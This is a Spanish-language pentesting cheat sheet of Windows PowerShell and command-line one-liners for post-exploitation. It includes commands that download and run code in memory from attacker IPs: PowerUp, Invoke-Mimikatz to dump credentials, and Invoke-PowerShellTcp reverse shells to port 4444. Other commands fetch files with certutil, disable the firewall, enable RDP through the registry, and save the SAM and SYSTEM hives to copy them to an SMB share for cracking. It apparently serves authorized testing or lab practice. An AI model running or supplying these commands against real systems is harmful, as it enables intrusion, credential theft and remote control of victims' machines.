# iniciar powershell con permisos para correr scripts
powershell.exe -nop -exec bypass

# importar un modulo
Import-Module PowerUp.ps1

# oneLiner para correr un script
C:\> powershell.exe -exec bypass -Command “& {Import-Module .\PowerUp.ps1; Invoke-AllChecks}”

# Descargar + ejecutar sin tocar el disco
C:\> powershell.exe -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString(‘http://bit.ly/1mK64oH’); Invoke-AllChecks”
powershell.exe -exec bypass -command "IEX(New-Object System.Net.WebClient).DownloadString('http://$PENTEST_BOX_IP/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds"
powershell.exe -exec bypass -command "IEX(New-Object System.Net.WebClient).DownloadString('http://10.11.41.181:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.11.41.181 -Port 4444"

# Descargas via CLI en windows
powershell.exe -c "Invoke-WebRequest -Uri 'http://10.8.50.72/Advanced.exe' -OutFile 'c:\program files (x86)\IObit\Advanced.exe'"
IEX(New-Object Net.WebClient).downloadString('http://10.11.41.181:8000/powerup.ps1')
C:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX(New-Object Net.WebClient).downloadString('http://10.11.41.181:8000/rev.ps1')
powershell.exe -ep -Bypass -nop -noexit -c IEX"(New-Object Net.WebClient).downloadstring('http://ip/file')
powershell.exe -c "(New-Object System.Net.Webclient).DownloadFile('http://ip/file', 'c:\Users\user\file')"
Invoke-WebRequest "http://ip/file" -OutFile "c:\Users\file"
certutil.exe -f -urlcache -split http://ip/file file

# copiar archivos via compartida
copy \\IP\SHARE\FILE FILE
c:\tmp>copy \\10.11.14.106\smbfolder\winPEAS.exe winPEAS.exe

# Firewall rules en Windows
netsh advfirewall firewall add rule name=NOMBRE_REGLA protocol=PROTO dir=in localport=PORT action=allow
netsh advfirewall firewall add rule name=NOMBRE_REGLA protocol=PROTO dir=out localport=PORT action=allow
netsh advfirewall firewall set allprofiles state off
netsh advfirewall firewall delete rule name=NOMBRE_REGLA

# Activar RDP via CLI
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

# SAM Crack 
reg save HKLM\SAM sam.backup
reg save HKLM\SYSTEM system.backup

copy sam.backup \\IP\smbfolder\sam
copy system.backup \\IP\smbfolder\system
pwdump system sam

# comandos
whoami /priv
Start-Process "shell.exe"
systeminfo
net localgroup Administrators --> lista los miembros del grupo Administrators
